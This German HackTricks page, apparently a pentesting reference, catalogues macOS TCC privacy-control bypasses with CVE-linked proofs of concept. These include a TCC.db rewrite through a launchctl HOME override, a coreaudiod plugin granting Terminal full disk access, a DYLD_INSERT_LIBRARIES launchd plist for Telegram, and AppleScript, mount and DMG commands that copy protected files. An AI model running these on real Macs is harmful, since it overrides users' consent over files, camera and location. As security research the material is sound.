# macOS TCC Umgehungen

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Nach Funktionalität

### Schreibumgehung

Dies ist keine Umgehung, sondern nur wie TCC funktioniert: **Es schützt nicht vor dem Schreiben**. Wenn das Terminal **keinen Zugriff auf den Desktop eines Benutzers zum Lesen hat, kann es dennoch darin schreiben**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Das **erweiterte Attribut `com.apple.macl`** wird der neuen **Datei** hinzugefügt, um der **Ersteller-App** Zugriff auf das Lesen zu ermöglichen.

### SSH-Bypass

Standardmäßig hatte ein Zugriff über **SSH "Full Disk Access"**. Um dies zu deaktivieren, müssen Sie es aufgelistet haben, aber deaktiviert (das Entfernen aus der Liste entfernt diese Berechtigungen nicht):

![](<../../../../../.gitbook/assets/image (569).png>)

Hier finden Sie Beispiele, wie einige **Malware in der Lage war, diesen Schutz zu umgehen**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Beachten Sie, dass Sie jetzt **"Full Disk Access"** benötigen, um SSH aktivieren zu können.
{% endhint %}

### Erweiterungen behandeln - CVE-2022-26767

Das Attribut **`com.apple.macl`** wird Dateien zugewiesen, um einer **bestimmten Anwendung Berechtigungen zum Lesen** zu geben. Dieses Attribut wird gesetzt, wenn eine Datei über eine App **gezogen und abgelegt** wird oder wenn ein Benutzer eine Datei **doppelklickt**, um sie mit der **Standardanwendung** zu öffnen.

Daher könnte ein Benutzer eine bösartige App registrieren, um alle Erweiterungen zu behandeln und Launch Services aufrufen, um **beliebige Dateien zu öffnen** (damit die bösartige Datei Zugriff zum Lesen erhält).

### iCloud

Mit der Berechtigung **`com.apple.private.icloud-account-access`** ist es möglich, mit dem **`com.apple.iCloudHelper`** XPC-Dienst zu kommunizieren, der **iCloud-Token bereitstellt**.

**iMovie** und **Garageband** hatten diese Berechtigung und andere, die es erlaubten.

Für weitere **Informationen** über den Exploit, um **iCloud-Token** aus dieser Berechtigung zu erhalten, siehe den Vortrag: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Eine App mit der Berechtigung **`kTCCServiceAppleEvents`** kann andere Apps **steuern**. Das bedeutet, dass sie die Berechtigungen, die den anderen Apps gewährt wurden, **missbrauchen** könnte.

Für weitere Informationen über Apple Scripts siehe:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Zum Beispiel, wenn eine App **Automatisierungsberechtigungen über `iTerm`** hat, hat in diesem Beispiel **`Terminal`** Zugriff auf iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Über iTerm

Terminal, das kein FDA hat, kann iTerm aufrufen, das es hat, und es verwenden, um Aktionen auszuführen:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Über Finder

Oder wenn eine App Zugriff über Finder hat, könnte sie ein Skript wie dieses verwenden:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Nach App-Verhalten

### CVE-2020-9934 - TCC <a href="#c19b" id="c19b"></a>

Der Benutzerland-Dämon **tccd** verwendet die Umgebungsvariable **`HOME`**, um auf die TCC-Benutzerdatenbank unter **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** zuzugreifen.

Gemäß [diesem Stack Exchange-Beitrag](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) und da der TCC-Dämon über `launchd` innerhalb der aktuellen Benutzerdomäne ausgeführt wird, ist es möglich, **alle Umgebungsvariablen** zu kontrollieren, die an ihn übergeben werden.\
Daher könnte ein Angreifer die Umgebungsvariable `$HOME` in `launchctl` so setzen, dass sie auf ein **kontrolliertes Verzeichnis** zeigt, den TCC-Dämon **neu starten** und dann die TCC-Datenbank **direkt modifizieren**, um sich selbst **alle verfügbaren TCC-Berechtigungen** zu geben, ohne den Endbenutzer jemals um Erlaubnis zu bitten.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notizen

Notizen hatte Zugriff auf TCC-geschützte Orte, aber wenn eine Notiz erstellt wird, wird diese in einem nicht geschützten Ort erstellt. Sie könnten also Notizen bitten, eine geschützte Datei in einer Notiz (also an einem nicht geschützten Ort) zu kopieren und dann auf die Datei zuzugreifen:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokation

Die Binärdatei `/usr/libexec/lsd` mit der Bibliothek `libsecurity_translocate` hatte die Berechtigung `com.apple.private.nullfs_allow`, die es ihr ermöglichte, ein Nullfs-Mount zu erstellen, und die Berechtigung `com.apple.private.tcc.allow` mit `kTCCServiceSystemPolicyAllFiles`, um auf jede Datei zuzugreifen.

Es war möglich, das Quarantäneattribut auf "Library" hinzuzufügen, den XPC-Dienst `com.apple.security.translocation` aufzurufen und dann würde Library auf `$TMPDIR/AppTranslocation/d/d/Library` abgebildet, wo alle Dokumente in Library **zugänglich** wären.

### CVE-2023-38571 - Musik & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Musik`** hat eine interessante Funktion: Wenn es läuft, importiert es die in **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** abgelegten Dateien in die "Mediathek" des Benutzers. Außerdem ruft es etwas wie **`rename(a, b);`** auf, wobei `a` und `b` folgendes sind:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Dieses **`rename(a, b);`**-Verhalten ist anfällig für eine **Race Condition**, da es möglich ist, in den Ordner `Automatically Add to Music.localized` eine gefälschte **TCC.db**-Datei zu legen und dann, wenn der neue Ordner (b) erstellt wird, die Datei zu kopieren, zu löschen und auf **`~/Library/Application Support/com.apple.TCC`** zu verweisen.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Wenn **`SQLITE_SQLLOG_DIR="Pfad/Ordner"`** gesetzt ist, bedeutet dies im Grunde, dass jede geöffnete Datenbank in diesen Pfad kopiert wird. In dieser CVE wurde diese Kontrolle missbraucht, um in eine SQLite-Datenbank zu schreiben, die von einem Prozess mit FDA der TCC-Datenbank geöffnet wird, und dann **`SQLITE_SQLLOG_DIR`** mit einem Symlink im Dateinamen zu missbrauchen. Wenn diese Datenbank geöffnet wird, wird die Benutzer-TCC.db mit der geöffneten überschrieben.\
**Weitere Informationen** [**im Writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **und** [**im Vortrag**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Wenn die Umgebungsvariable **`SQLITE_AUTO_TRACE`** gesetzt ist, beginnt die Bibliothek **`libsqlite3.dylib`** mit dem Protokollieren aller SQL-Abfragen. Viele Anwendungen verwendeten diese Bibliothek, daher war es möglich, alle ihre SQLite-Abfragen zu protokollieren.

Mehrere Apple-Anwendungen verwendeten diese Bibliothek, um auf TCC-geschützte Informationen zuzugreifen.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Diese **Umgebungsvariable wird vom `Metal`-Framework** verwendet, das eine Abhängigkeit von verschiedenen Programmen hat, insbesondere von `Music`, das FDA hat.

Wenn Sie Folgendes festlegen: `MTL_DUMP_PIPELINES_TO_JSON_FILE="Pfad/Name"`. Wenn `Pfad` ein gültiges Verzeichnis ist, wird der Fehler ausgelöst und wir können `fs_usage` verwenden, um zu sehen, was im Programm passiert:

* Eine Datei namens `Pfad/.dat.nosyncXXXX.XXXXXX` (X ist zufällig) wird `open()`ed.
* Eine oder mehrere `write()`s schreiben den Inhalt in die Datei (den wir nicht kontrollieren).
* `Pfad/.dat.nosyncXXXX.XXXXXX` wird in `Pfad/Name` `rename()`d.

Es handelt sich um eine temporäre Dateischreiboperation, gefolgt von einem **`rename(old, new)`**, **das nicht sicher ist**.

Es ist nicht sicher, weil es die alten und neuen Pfade separat auflösen muss, was einige Zeit in Anspruch nehmen kann und anfällig für eine Race Condition sein kann. Weitere Informationen finden Sie in der `xnu`-Funktion `renameat_internal()`.

{% hint style="danger" %}
Also, im Grunde genommen, wenn ein privilegierter Prozess von einem von Ihnen kontrollierten Ordner umbenannt wird, könnten Sie eine RCE gewinnen und ihn dazu bringen, auf eine andere Datei zuzugreifen oder, wie in dieser CVE, die von der privilegierten App erstellte Datei zu öffnen und eine FD zu speichern.

Wenn die Umbenennung auf einen von Ihnen kontrollierten Ordner zugreift, während Sie die Quelldatei geändert haben oder eine FD dazu haben, ändern Sie die Zieldatei (oder den Ordner) so, dass sie auf einen Symlink zeigt, sodass Sie jederzeit schreiben können.
{% endhint %}

Dies war der Angriff in der CVE: Um beispielsweise die `TCC.db` des Benutzers zu überschreiben, können wir Folgendes tun:

* Erstellen Sie `/Users/hacker/ourlink`, das auf `/Users/hacker/Library/Application Support/com.apple.TCC/` zeigt.
* Erstellen Sie das Verzeichnis `/Users/hacker/tmp/`.
* Setzen Sie `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`.
* Lösen Sie den Fehler aus, indem Sie `Music` mit dieser Umgebungsvariable ausführen.
* Fangen Sie das `open()` von `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X ist zufällig) ab.
* Hier öffnen wir diese Datei auch zum Schreiben und behalten den Dateideskriptor bei.
* Wechseln Sie atomar `/Users/hacker/tmp` in einer Schleife mit `/Users/hacker/ourlink` **aus**.
* Wir tun dies, um unsere Chancen zu maximieren, erfolgreich zu sein, da das Rennfenster ziemlich klein ist, aber das Verlieren des Rennens hat vernachlässigbare Nachteile.
* Warten Sie eine Weile.
* Überprüfen Sie, ob wir Glück hatten.
* Wenn nicht, führen Sie den Vorgang erneut von vorne aus.

Weitere Informationen finden Sie unter [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Wenn Sie jetzt versuchen, die Umgebungsvariable `MTL_DUMP_PIPELINES_TO_JSON_FILE` zu verwenden, werden Apps nicht gestartet.
{% endhint %}

### Apple Remote Desktop

Als Root können Sie diesen Dienst aktivieren und der **ARD-Agent hat vollen Festplattenzugriff**, der dann von einem Benutzer missbraucht werden kann, um eine neue **TCC-Benutzerdatenbank** zu kopieren.

## Durch **NFSHomeDirectory**

TCC verwendet eine Datenbank im HOME-Verzeichnis des Benutzers, um den Zugriff auf ressourcenspezifische Ressourcen für den Benutzer unter **$HOME/Library/Application Support/com.apple.TCC/TCC.db** zu steuern.\
Daher kann der Benutzer, wenn es ihm gelingt, TCC mit einer $HOME-Umgebungsvariable neu zu starten, die auf einen **anderen Ordner** zeigt, eine neue TCC-Datenbank in **/Library/Application Support/com.apple.TCC/TCC.db** erstellen und TCC dazu bringen, einer beliebigen App beliebige TCC-Berechtigungen zu gewähren.

{% hint style="success" %}
Beachten Sie, dass Apple die in der Benutzerprofil gespeicherte Einstellung im **`NFSHomeDirectory`**-Attribut für den Wert von `$HOME` verwendet. Wenn Sie also eine Anwendung kompromittieren, die Berechtigungen zum Ändern dieses Werts hat (**`kTCCServiceSystemPolicySysAdminFiles`**), können Sie diese Option mit einem TCC-Bypass **wirksam einsetzen**.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Der **erste POC** verwendet [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) und [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), um das HOME-Verzeichnis des Benutzers zu ändern.

1. Erhalten Sie einen _csreq_-Blob für die Ziel-App.
2. Platzieren Sie eine gefälschte _TCC.db_-Datei mit erforderlichem Zugriff und dem _csreq_-Blob.
3. Exportieren Sie den Directory Services-Eintrag des Benutzers mit [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Ändern Sie den Directory Services-Eintrag, um das Home-Verzeichnis des Benutzers zu ändern.
5. Importieren Sie den modifizierten Directory Services-Eintrag mit [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stoppen Sie den _tccd_ des Benutzers und starten Sie den Prozess neu.

Der zweite POC verwendete **`/usr/libexec/configd`**, das `com.apple.private.tcc.allow` mit dem Wert `kTCCServiceSystemPolicySysAdminFiles` hatte.\
Es war möglich, **`configd`** mit der Option **`-t`** auszuführen, wodurch ein Angreifer eine **benutzerdefinierte Bundle zum Laden** angeben konnte. Daher ersetzt der Exploit die Methode **`dsexport`** und **`dsimport`** zum Ändern des Home-Verzeichnisses des Benutzers durch eine **`configd`-Codeinjektion**.

Weitere Informationen finden Sie im [**Originalbericht**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Durch Prozesseinspritzung

Es gibt verschiedene Techniken, um Code in einen Prozess einzuspritzen und seine TCC-Berechtigungen zu missbrauchen:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Darüber hinaus ist die häufigste Methode zur Umgehung von TCC durch **Plugins (Load Library)**.\
Plugins sind zusätzlicher Code, normalerweise in Form von Bibliotheken oder Plist, der von der Hauptanwendung **geladen wird** und unter ihrem Kontext ausgeführt wird. Wenn die Hauptanwendung also Zugriff auf TCC-eingeschränkte Dateien hatte (über gewährte Berechtigungen oder Entitlements), wird der **benutzerdefinierte Code dies auch haben**.

### CVE-2020-27937 - Directory Utility

Die Anwendung `/System/Library/CoreServices/Applications/Directory Utility.app` hatte das Entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, lud Plugins mit der Erweiterung **`.daplug`** und hatte nicht die gehärtete Laufzeitumgebung.

Um diese CVE wirksam einzusetzen, wird das **`NFSHomeDirectory`** geändert (unter Ausnutzung des vorherigen Entitlements), um die TCC-Datenbank des Benutzers zu übernehmen und TCC zu umgehen.

Weitere Informationen finden Sie im [**Originalbericht**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
### CVE-2020-29621 - Coreaudiod

Die Binärdatei **`/usr/sbin/coreaudiod`** hatte die Berechtigungen `com.apple.security.cs.disable-library-validation` und `com.apple.private.tcc.manager`. Die erste Berechtigung erlaubt das **Einfügen von Code** und die zweite gibt Zugriff auf die **Verwaltung von TCC**.

Diese Binärdatei erlaubte das Laden von **Plug-Ins von Drittanbietern** aus dem Ordner `/Library/Audio/Plug-Ins/HAL`. Daher war es möglich, mit diesem PoC ein Plugin zu laden und die TCC-Berechtigungen zu **missbrauchen**:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Für weitere Informationen siehe den [**Originalbericht**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Geräteabstraktionsschicht (Device Abstraction Layer, DAL) Plug-Ins

Systemanwendungen, die den Kamerastream über Core Media I/O öffnen (Apps mit **`kTCCServiceCamera`**), laden **in diesen Prozess die Plugins**, die sich in `/Library/CoreMediaIO/Plug-Ins/DAL` befinden (nicht durch SIP eingeschränkt).

Es reicht aus, dort eine Bibliothek mit dem üblichen **Konstruktor** zu speichern, um Code **einzuschleusen**.

Mehrere Apple-Anwendungen waren anfällig dafür.

### Firefox

Die Firefox-Anwendung hatte die Berechtigungen `com.apple.security.cs.disable-library-validation` und `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Weitere Informationen darüber, wie man dies leicht ausnutzen kann, finden Sie in [**dem Originalbericht**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Die Binärdatei `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` hatte die Berechtigungen **`com.apple.private.tcc.allow`** und **`com.apple.security.get-task-allow`**, was es ermöglichte, Code in den Prozess einzufügen und die TCC-Berechtigungen zu nutzen.

### CVE-2023-26818 - Telegram

Telegram hatte die Berechtigungen **`com.apple.security.cs.allow-dyld-environment-variables`** und **`com.apple.security.cs.disable-library-validation`**, daher war es möglich, diese zu missbrauchen, um Zugriff auf seine Berechtigungen zu erhalten, wie z.B. das Aufnehmen mit der Kamera. Sie können [**die Nutzlast im Bericht finden**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Beachten Sie, wie die Umgebungsvariable verwendet wird, um eine Bibliothek zu laden. Eine **benutzerdefinierte plist** wurde erstellt, um diese Bibliothek einzufügen, und **`launchctl`** wurde verwendet, um sie zu starten:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Durch offene Aufrufe

Es ist möglich, **`open`** auch im Sandbox-Modus aufzurufen.

### Terminal-Skripte

Es ist üblich, dem Terminal **Vollzugriff auf die Festplatte (FDA)** zu geben, zumindest bei Computern, die von technisch versierten Personen verwendet werden. Und es ist möglich, **`.terminal`**-Skripte damit aufzurufen.

**`.terminal`**-Skripte sind plist-Dateien wie diese, mit dem auszuführenden Befehl im Schlüssel **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Eine Anwendung könnte ein Terminal-Skript an einem Ort wie /tmp schreiben und es mit einem Befehl wie folgt starten:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Durch Mounten

### CVE-2020-9771 - mount\_apfs TCC-Bypass und Privilege Escalation

**Jeder Benutzer** (auch nicht privilegierte) kann ein Time Machine-Snapshot erstellen und mounten und **auf ALLE Dateien** dieses Snapshots zugreifen.\
Die einzige erforderliche Berechtigung ist, dass die verwendete Anwendung (wie `Terminal`) **Vollzugriff auf die Festplatte** (FDA) (`kTCCServiceSystemPolicyAllfiles`) hat, was von einem Administrator gewährt werden muss.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Eine detailliertere Erklärung finden Sie im [**Originalbericht**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount über TCC-Datei

Auch wenn die TCC-DB-Datei geschützt ist, war es möglich, über das Verzeichnis eine neue TCC.db-Datei zu **mounten**:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Überprüfen Sie den **vollständigen Exploit** im [**ursprünglichen Bericht**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Das Tool **`/usr/sbin/asr`** ermöglichte das Kopieren der gesamten Festplatte und das Mounten an einem anderen Ort, um die TCC-Schutzmaßnahmen zu umgehen.

### Ortungsdienste

Es gibt eine dritte TCC-Datenbank in **`/var/db/locationd/clients.plist`**, um Clients zu kennzeichnen, die auf **Ortungsdienste zugreifen** dürfen.\
Der Ordner **`/var/db/locationd/` war nicht vor DMG-Mounting geschützt**, daher war es möglich, unsere eigene plist zu mounten.

## Durch Startanwendungen

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Durch grep

In mehreren Fällen werden sensible Informationen wie E-Mails, Telefonnummern, Nachrichten usw. in nicht geschützten Orten gespeichert (was als Sicherheitslücke bei Apple gilt).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Synthetische Klicks

Dies funktioniert nicht mehr, aber es [**hat in der Vergangenheit funktioniert**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ein anderer Weg unter Verwendung von [**CoreGraphics-Ereignissen**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Referenz

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Möglichkeiten, Ihre macOS-Datenschutzmechanismen zu umgehen**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout-Sieg gegen TCC - 20+ NEUE Möglichkeiten, Ihre MacOS-Datenschutzmechanismen zu umgehen**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>
